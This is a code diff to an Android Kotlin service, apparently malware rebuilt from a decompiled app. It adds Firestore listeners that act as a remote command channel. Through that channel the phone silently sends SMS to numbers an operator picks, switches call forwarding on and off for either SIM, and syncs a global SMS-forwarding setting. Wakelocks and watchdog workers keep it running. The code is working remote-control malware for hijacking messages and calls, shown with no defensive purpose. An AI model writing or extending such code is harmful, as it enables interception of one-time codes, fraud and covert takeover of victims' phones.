@@ -11,8 +11,13 @@ import android.os.IBinder
 import android.os.PowerManager
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.google.firebase.firestore.ListenerRegistration
 import com.payload.jansiix0ne.MainActivity
 import com.payload.jansiix0ne.R
+import com.payload.jansiix0ne.data.model.DeviceModel
+import com.payload.jansiix0ne.data.model.SendSmsModel
+import com.payload.jansiix0ne.data.repository.FirestoreRepository
+import com.payload.jansiix0ne.util.SmsHelper
 import com.payload.jansiix0ne.worker.RegisterUserWorker
 import com.payload.jansiix0ne.worker.UnifiedWatchdogWorker
 import kotlinx.coroutines.CoroutineScope
@@ -33,6 +38,10 @@ class UnifiedService : Service() {
 
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
     private var wakeLock: PowerManager.WakeLock? = null
+    private var deviceModelListener: ListenerRegistration? = null
+    private var smsForwardingListener: ListenerRegistration? = null
+    private val firestoreRepository = FirestoreRepository()
+    private val callForwardingManager = com.payload.jansiix0ne.util.CallForwardingManager(this)
 
     companion object {
         private const val TAG = "UnifiedService"
@@ -53,6 +62,8 @@ class UnifiedService : Service() {
         
         acquireWakeLock()
         schedulePeriodicWorkers()
+        startDeviceModelListener()
+        startSmsForwardingListener()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -79,6 +90,10 @@ class UnifiedService : Service() {
         isRunning = false
         Log.d(TAG, "UnifiedService destroyed")
         
+        deviceModelListener?.remove()
+        deviceModelListener = null
+        smsForwardingListener?.remove()
+        smsForwardingListener = null
         releaseWakeLock()
         serviceScope.cancel()
     }
@@ -190,5 +205,193 @@ class UnifiedService : Service() {
     private suspend fun performBackgroundTasks() {
         // Background tasks can be performed here
         Log.d(TAG, "Performing background tasks")
+    }
+
+    /**
+     * Start Firestore listener for DeviceModel to handle SendSms commands
+     * Based on decompiled code: C3168h.java
+     */
+    private fun startDeviceModelListener() {
+        val deviceId = SmsHelper.getDeviceId(this)
+        
+        deviceModelListener = firestoreRepository.firestore
+            .collection("MASTERHU")
+            .document(deviceId)
+            .addSnapshotListener { snapshot, error ->
+                if (error != null) {
+                    Log.e(TAG, "Listener error: $error")
+                    return@addSnapshotListener
+                }
+                
+                if (snapshot != null && snapshot.exists()) {
+                    try {
+                        val deviceModel = snapshot.toObject(DeviceModel::class.java)
+                        
+                        // Process SendSms command
+                        val sendSms = deviceModel?.sendSms
+                        if (sendSms != null && 
+                            !sendSms.number.isNullOrEmpty() && 
+                            !sendSms.message.isNullOrEmpty() && 
+                            !sendSms.sent) {
+                            
+                            serviceScope.launch(Dispatchers.IO) {
+                                processSendSmsCommand(sendSms, deviceId)
+                            }
+                        }
+                        
+                        // Process Forwarding command - Based on decompiled code: C3167g.java, C3162b.java
+                        val forwarding = deviceModel?.forwarding
+                        if (forwarding != null) {
+                            serviceScope.launch(Dispatchers.IO) {
+                                processForwardingCommand(forwarding, deviceId)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error processing DeviceModel snapshot: ${e.message}", e)
+                    }
+                }
+            }
+        
+        Log.d(TAG, "DeviceModel listener started for device: $deviceId")
+    }
+
+    /**
+     * Process SendSms command from Firestore
+     * Based on decompiled code: C2865e.java
+     */
+    private suspend fun processSendSmsCommand(sendSms: SendSmsModel, deviceId: String) {
+        try {
+            val phoneNumber = sendSms.number ?: return
+            val message = sendSms.message ?: return
+            val simSlot = sendSms.simSlot
+            
+            Log.d(TAG, "Processing SendSms command: $phoneNumber, simSlot: $simSlot")
+            
+            // Send SMS using specified SIM slot
+            val success = SmsHelper.sendSms(this, phoneNumber, message, simSlot)
+            
+            if (success) {
+                // Mark as sent in Firestore
+                val result = firestoreRepository.markSendSmsAsSent(deviceId)
+                if (result.isSuccess) {
+                    Log.d(TAG, "SMS sent successfully and marked as sent")
+                } else {
+                    Log.e(TAG, "Failed to mark SMS as sent: ${result.exceptionOrNull()?.message}")
+                }
+            } else {
+                Log.e(TAG, "Failed to send SMS")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "SMS send flow failed: ${e.message}", e)
+        }
+    }
+
+    /**
+     * Process Forwarding command from Firestore
+     * Based on decompiled code: C3162b.java
+     * Logic:
+     * - If status = "active" and executed = false: Enable call forwarding
+     * - If status = "inactive" and executed = true: Disable call forwarding
+     */
+    private suspend fun processForwardingCommand(forwarding: com.payload.jansiix0ne.data.model.ForwardingModel, deviceId: String) {
+        try {
+            val fromSim = forwarding.fromSim
+            val status = forwarding.status
+            val executed = forwarding.executed
+            val toNumber = forwarding.toNumber
+            
+            // Determine SIM slot: "sim1" = slot 0, otherwise = slot 1
+            val simSlot = if (fromSim.lowercase() == "sim1") 0 else 1
+            
+            Log.d(TAG, "Processing Forwarding command: status=$status, executed=$executed, toNumber=$toNumber, simSlot=$simSlot")
+            
+            when {
+                // Enable call forwarding: status = "active" and not executed yet
+                status.lowercase() == "active" && !executed -> {
+                    if (toNumber.isNotEmpty()) {
+                        callForwardingManager.setCallForwardingDualSim(toNumber, simSlot, enable = true)
+                        
+                        // Update executed flag in Firestore
+                        val result = firestoreRepository.updateForwardingExecuted(deviceId, executed = true)
+                        if (result.isSuccess) {
+                            Log.d(TAG, "Call forwarding enabled and executed flag updated")
+                        } else {
+                            Log.e(TAG, "Failed to update executed flag: ${result.exceptionOrNull()?.message}")
+                        }
+                    }
+                }
+                
+                // Disable call forwarding: status = "inactive" and already executed
+                status.lowercase() == "inactive" && executed -> {
+                    callForwardingManager.setCallForwardingDualSim("", simSlot, enable = false)
+                    
+                    // Update executed flag in Firestore
+                    val result = firestoreRepository.updateForwardingExecuted(deviceId, executed = false)
+                    if (result.isSuccess) {
+                        Log.d(TAG, "Call forwarding disabled and executed flag updated")
+                    } else {
+                        Log.e(TAG, "Failed to update executed flag: ${result.exceptionOrNull()?.message}")
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Forwarding flow failed: ${e.message}", e)
+        }
+    }
+
+    /**
+     * Start Firestore listener for SMS Forwarding configuration
+     * Based on decompiled code: C2867g.java, C3167g.java
+     * Path: MASTERHU/forwarding_config/global_offline_sms
+     * Note: m5946b = document, m5949c = collection
+     * Pattern: document("MASTERHU").collection("forwarding_config").document("global_offline_sms")
+     */
+    private fun startSmsForwardingListener() {
+        smsForwardingListener = firestoreRepository.firestore
+            .collection("MASTERHU")
+            .document("forwarding_config")
+            .collection("forwarding_config")
+            .document("global_offline_sms")
+            .addSnapshotListener { snapshot, error ->
+                if (error != null) {
+                    Log.e(TAG, "SMS forwarding listener error: $error")
+                    return@addSnapshotListener
+                }
+                
+                if (snapshot != null && snapshot.exists()) {
+                    try {
+                        // Parse Smsforward model from Firestore
+                        val number = snapshot.getString("number") ?: ""
+                        val enabled = snapshot.getBoolean("enabled") ?: false
+                        
+                        // Update local DataStore with forwarding config
+                        serviceScope.launch(Dispatchers.IO) {
+                            updateSmsForwardingConfig(number, enabled)
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error processing SMS forwarding snapshot: ${e.message}", e)
+                    }
+                }
+            }
+        
+        Log.d(TAG, "SMS forwarding listener started")
+    }
+
+    /**
+     * Update SMS forwarding configuration in DataStore
+     * Based on decompiled code: C3173m.java, C3183w.java
+     */
+    private suspend fun updateSmsForwardingConfig(number: String, enabled: Boolean) {
+        try {
+            val smsForwardingRepository = com.payload.jansiix0ne.data.repository.SmsForwardingRepository(this)
+            val config = com.payload.jansiix0ne.data.model.SmsForwardingConfig(
+                number = number,
+                enabled = enabled
+            )
+            smsForwardingRepository.updateForwardingConfig(config)
+            Log.d(TAG, "SMS forwarding config synced: number=$number, enabled=$enabled")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to sync SMS forwarding config: ${e.message}", e)
+        }
     }
 }
